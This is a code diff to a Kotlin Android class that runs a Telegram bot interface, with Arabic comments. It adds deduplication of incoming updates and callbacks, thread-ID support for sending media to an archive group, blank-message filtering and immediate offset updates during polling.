@@ -28,19 +28,11 @@ import kotlin.random.Random
  * معالجة الأوامر، وعرض القوائم التفاعلية.
  *
  * ✅ التعديلات الجديدة:
- * - إزالة تسريب كلمة السر تماماً (لا تظهر في أي رسالة خطأ).
- * - توحيد استخدام التوكن عبر Leader Election لجميع الدوال.
- * - تمرير التوكن المستقبل إلى Commands.ex لضمان استجابة البوت نفسه.
- * - تحسين handleCallback لإرسال answerCallbackQuery فوراً.
- * - إضافة سجلات تشخيصية بدون كشف المعلومات الحساسة.
- * - إصلاح مشكلة عرض لوحة المفاتيح في الكروبات ذات المواضيع (Forums) بإضافة message_thread_id و reply_to_message_id.
- * - ضمان استخدام نفس التوكن الذي استلم الطلب للرد عليه.
- * - ✅ تغيير sendMessageDirect إلى internal للسماح بالاستدعاء من Commands.kt.
- * - ✅ إضافة دالة answerCallbackQueryDirect للرد على استعلامات الأزرار مباشرة.
- * - ✅ إصلاح مشكلة "message thread not found" عن طريق تمرير threadId دائماً (حتى لو كانت 0) في sendMessageDirect.
- * - ✅ إضافة استخراج threadId و replyToMessageId في handleCallback وتمريرهما إلى Commands.ex.
- * - ✅ لوحة المفاتيح الرئيسية تحتوي على إيموجيز فريدة ومختلفة لكل زر.
- * - ✅ دالة sendMessageDirect تمرر message_thread_id دائماً لتجنب أخطاء المواضيع.
+ * - إضافة processedUpdates للتحقق من التحديثات المكررة (الرسائل والأزرار).
+ * - تعديل دوال الإرسال (sendDocument, sendPhoto, sendVoice, sendVideo, sendAudio) لتقبل threadId.
+ * - تعديل handleMessage لتجاهل الرسائل الفارغة والمكررة باستخدام processedUpdates.
+ * - إصلاح offset بتحديثه فوراً بعد كل تحديث.
+ * - ضمان تمرير threadId و replyToMessageId في جميع الدوال.
  */
 class TelegramUi(
     context: Context,
@@ -80,6 +72,8 @@ class TelegramUi(
 
     private val sessions = ConcurrentHashMap<String, Long>()
     private val devices = ConcurrentHashMap<String, JSONObject>()
+
+    // ✅ مجموعة لمنع معالجة التحديثات المكررة (مشتركة بين الرسائل والأزرار)
     private val processedUpdates = Collections.synchronizedSet(LinkedHashSet<String>())
 
     @Volatile
@@ -148,7 +142,6 @@ class TelegramUi(
             .replace(Regex("[\\s\\u00A0\\u2007\\u202F\\uFEFF\\u2060\\u200B\\u200C\\u200D\\u180E]+"), "")
         val result = cleanInput == cleanSecret
 
-        // سجل بدون كشف السر
         writeLog("🔐 Password verification: ${if (result) "SUCCESS" else "FAILED"}")
         if (!result) {
             MainActivity.appendLogStatic("🔐 Password FAILED for input (len: ${cleanInput.length})")
@@ -480,36 +473,46 @@ class TelegramUi(
     }
 
     // ============================================================
-    // ✅ توجيه الوسائط حصرياً لكروب الأرشيف (A2)
+    // ✅ توجيه الوسائط حصرياً لكروب الأرشيف (A2) مع دعم threadId
     // ============================================================
-    fun sendDocument(chatId: Long, file: File, caption: String): JSONObject? {
+    fun sendDocument(chatId: Long, file: File, caption: String, threadId: Long = 0L): JSONObject? {
         if (!file.exists()) return null
         val targetChat = if (chatId == config.controlId) config.vaultId else chatId
-        return _api("sendDocument", mapOf("chat_id" to targetChat, "caption" to caption), mapOf("document" to file))
+        val params = mutableMapOf<String, Any>("chat_id" to targetChat, "caption" to caption)
+        if (threadId != 0L) params["message_thread_id"] = threadId
+        return _api("sendDocument", params, mapOf("document" to file))
     }
 
-    fun sendPhoto(chatId: Long, file: File, caption: String): JSONObject? {
+    fun sendPhoto(chatId: Long, file: File, caption: String, threadId: Long = 0L): JSONObject? {
         if (!file.exists()) return null
         val targetChat = if (chatId == config.controlId) config.vaultId else chatId
-        return _api("sendPhoto", mapOf("chat_id" to targetChat, "caption" to caption), mapOf("photo" to file))
+        val params = mutableMapOf<String, Any>("chat_id" to targetChat, "caption" to caption)
+        if (threadId != 0L) params["message_thread_id"] = threadId
+        return _api("sendPhoto", params, mapOf("photo" to file))
     }
 
-    fun sendVoice(chatId: Long, file: File): JSONObject? {
+    fun sendVoice(chatId: Long, file: File, threadId: Long = 0L): JSONObject? {
         if (!file.exists()) return null
         val targetChat = if (chatId == config.controlId) config.vaultId else chatId
-        return _api("sendVoice", mapOf("chat_id" to targetChat), mapOf("voice" to file))
+        val params = mutableMapOf<String, Any>("chat_id" to targetChat)
+        if (threadId != 0L) params["message_thread_id"] = threadId
+        return _api("sendVoice", params, mapOf("voice" to file))
     }
 
-    fun sendVideo(chatId: Long, file: File, caption: String): JSONObject? {
+    fun sendVideo(chatId: Long, file: File, caption: String, threadId: Long = 0L): JSONObject? {
         if (!file.exists()) return null
         val targetChat = if (chatId == config.controlId) config.vaultId else chatId
-        return _api("sendVideo", mapOf("chat_id" to targetChat, "caption" to caption), mapOf("video" to file))
+        val params = mutableMapOf<String, Any>("chat_id" to targetChat, "caption" to caption)
+        if (threadId != 0L) params["message_thread_id"] = threadId
+        return _api("sendVideo", params, mapOf("video" to file))
     }
 
-    fun sendAudio(chatId: Long, file: File, caption: String): JSONObject? {
+    fun sendAudio(chatId: Long, file: File, caption: String, threadId: Long = 0L): JSONObject? {
         if (!file.exists()) return null
         val targetChat = if (chatId == config.controlId) config.vaultId else chatId
-        return _api("sendAudio", mapOf("chat_id" to targetChat, "caption" to caption), mapOf("audio" to file))
+        val params = mutableMapOf<String, Any>("chat_id" to targetChat, "caption" to caption)
+        if (threadId != 0L) params["message_thread_id"] = threadId
+        return _api("sendAudio", params, mapOf("audio" to file))
     }
 
     fun registerDevice(deviceId: String, deviceModel: String): Long? {
@@ -731,16 +734,37 @@ class TelegramUi(
     }
 
     // ============================================================
-    // ✅ معالجة الرسائل مع سجلات تشخيصية مفصلة وإرسال مباشر للوحة المفاتيح
-    // ✅ إصلاح: تم تمرير threadId و replyToMessageId بشكل صحيح
+    // ✅ معالجة الرسائل مع تجاهل المكرر والفارغ باستخدام processedUpdates
     // ============================================================
     private suspend fun handleMessage(update: JSONObject, currentToken: String) {
         try {
+            val updateId = update.optLong("update_id", 0L)
+            // ✅ منع معالجة التحديثات المكررة
+            synchronized(processedUpdates) {
+                val idStr = updateId.toString()
+                if (processedUpdates.contains(idStr)) {
+                    writeLog("⏭️ Skipping duplicate message update: $idStr")
+                    return
+                }
+                if (processedUpdates.size >= 500) {
+                    // تنظيف جزئي لتجنب النمو اللانهائي
+                    val toRemove = processedUpdates.take(200)
+                    toRemove.forEach { processedUpdates.remove(it) }
+                }
+                processedUpdates.add(idStr)
+            }
+
             val msg = update.optJSONObject("message") ?: return
             val chatId = msg.optJSONObject("chat")?.optLong("id") ?: return
             val text = msg.optString("text", "").trim()
             val threadId = msg.optLong("message_thread_id", 0L)
             val replyToMessageId = msg.optLong("message_id", 0L)
+
+            // ✅ تجاهل الرسائل الفارغة أو التي تحتوي على مسافات فقط
+            if (text.isBlank()) {
+                writeLog("ℹ️ Empty/blank message received, ignoring")
+                return
+            }
 
             MainActivity.appendLogStatic("📩 Received: '$text' from $chatId (thread: $threadId)")
             writeLog("📩 Received: '$text' from $chatId (thread: $threadId)")
@@ -819,8 +843,6 @@ class TelegramUi(
 
     // ============================================================
     // ✅ دالة مساعدة للإرسال المباشر باستخدام التوكن الممرّر مع دعم السياق
-    // ✅ تم تغيير private إلى internal للسماح بالاستدعاء من Commands.kt
-    // ✅ إصلاح: تمرير message_thread_id دائماً (حتى لو كانت 0) لتجنب خطأ "message thread not found"
     // ============================================================
     internal suspend fun sendMessageDirect(
         token: String?,
@@ -834,8 +856,7 @@ class TelegramUi(
         return try {
             val payload = JSONObject().apply {
                 put("chat_id", chatId)
-                // ✅ تمرير message_thread_id دائماً (حتى لو كانت 0) لتجنب خطأ "message thread not found"
-                put("message_thread_id", threadId)
+                put("message_thread_id", threadId) // دائماً لتفادي أخطاء المواضيع
                 if (replyToMessageId != 0L) {
                     put("reply_to_message_id", replyToMessageId)
                 }
@@ -872,7 +893,7 @@ class TelegramUi(
     }
 
     // ============================================================
-    // ✅ دالة جديدة للرد على استعلامات الأزرار مباشرة باستخدام التوكن المحدد
+    // ✅ دالة للرد على استعلامات الأزرار مباشرة باستخدام التوكن المحدد
     // ============================================================
     internal suspend fun answerCallbackQueryDirect(token: String, cbId: String, text: String = ""): JSONObject? {
         return try {
@@ -896,7 +917,7 @@ class TelegramUi(
     }
 
     // ============================================================
-    // ✅ دالة مساعدة للاستدعاء المباشر بالتوكن المحدد (لـ answerCallbackQuery وغيرها)
+    // ✅ دالة مساعدة للاستدعاء المباشر بالتوكن المحدد
     // ============================================================
     private suspend fun apiCallWithToken(token: String, method: String, payload: JSONObject?): JSONObject? {
         return try {
@@ -917,8 +938,7 @@ class TelegramUi(
     }
 
     // ============================================================
-    // ✅ معالجة CallbackQuery بشكل صحيح مع تمرير التوكن إلى Commands
-    // ✅ إصلاح: استخراج threadId و replyToMessageId من الرسالة الأصلية
+    // ✅ معالجة CallbackQuery مع منع التكرار وتمرير التوكن
     // ============================================================
     private suspend fun handleCallback(update: JSONObject, currentToken: String) {
         try {
@@ -928,9 +948,16 @@ class TelegramUi(
             val cbId = cb.optString("id")
             if (cbId.isBlank()) return
 
+            // ✅ منع معالجة نفس callback_query أكثر من مرة
             synchronized(processedUpdates) {
-                if (processedUpdates.contains(cbId)) return
-                if (processedUpdates.size >= 150) processedUpdates.clear()
+                if (processedUpdates.contains(cbId)) {
+                    writeLog("⏭️ Skipping duplicate callback: $cbId")
+                    return
+                }
+                if (processedUpdates.size >= 500) {
+                    val toRemove = processedUpdates.take(200)
+                    toRemove.forEach { processedUpdates.remove(it) }
+                }
                 processedUpdates.add(cbId)
             }
 
@@ -939,7 +966,6 @@ class TelegramUi(
             val chatId = chat.optLong("id")
             val data = cb.optString("data", "")
 
-            // ✅ استخراج threadId و replyToMessageId من الرسالة الأصلية
             val threadId = message.optLong("message_thread_id", 0L)
             val replyToMessageId = message.optLong("message_id", 0L)
 
@@ -962,7 +988,7 @@ class TelegramUi(
                 return
             }
 
-            // ✅ توجيه الأمر لوحدة Commands مع تمرير التوكن الحالي و threadId و replyToMessageId
+            // ✅ توجيه الأمر لوحدة Commands
             try {
                 Commands.ex(
                     context = appContext ?: return,
@@ -1070,13 +1096,14 @@ class TelegramUi(
     }
 
     // ============================================================
-    // ✅ startPolling المُعدّل لاستخدام البوت الرئيسي مع تمرير التوكن لدوال المعالجة
+    // ✅ startPolling المُعدّل لاستخدام البوت الرئيسي مع تحديث offset فوراً
     // ============================================================
     private fun startPolling() {
         pollingJob = scope.launch {
             var offset = loadOffset()
             consecutivePollingErrors = 0
-            writeLog("Polling started with leader bot")
+            writeLog("Polling started with leader bot, offset=$offset")
+            MainActivity.appendLogStatic("📡 Polling started, offset=$offset")
 
             while (isRunning && isActive) {
                 val currentToken = getLeaderToken()
@@ -1087,7 +1114,7 @@ class TelegramUi(
                 }
 
                 try {
-                    val url = "https://api.telegram.org/bot$currentToken/getUpdates?offset=$offset&timeout=25"
+                    val url = "https://api.telegram.org/bot$currentToken/getUpdates?offset=$offset&timeout=30"
                     val request = Request.Builder()
                         .url(url)
                         .get()
@@ -1113,19 +1140,32 @@ class TelegramUi(
                     if (data.optBoolean("ok")) {
                         consecutivePollingErrors = 0
                         val results = data.optJSONArray("result") ?: JSONArray()
+
+                        if (results.length() > 0) {
+                            writeLog("📨 Received ${results.length()} updates")
+                        }
+
                         for (i in 0 until results.length()) {
                             val upd = results.getJSONObject(i)
                             val updateId = upd.getLong("update_id")
+
+                            // ✅ تحديث offset فوراً قبل أي معالجة
                             val newOffset = updateId + 1
                             if (newOffset > offset) {
                                 offset = newOffset
                                 saveOffset(offset)
                             }
-                            if (upd.has("message")) {
-                                handleMessage(upd, currentToken)
-                            }
-                            if (upd.has("callback_query")) {
-                                handleCallback(upd, currentToken)
+
+                            // ✅ معالجة التحديثات
+                            try {
+                                if (upd.has("message")) {
+                                    handleMessage(upd, currentToken)
+                                }
+                                if (upd.has("callback_query")) {
+                                    handleCallback(upd, currentToken)
+                                }
+                            } catch (e: Exception) {
+                                writeLog("❌ Update processing error: ${e.message}")
                             }
                         }
                     } else {
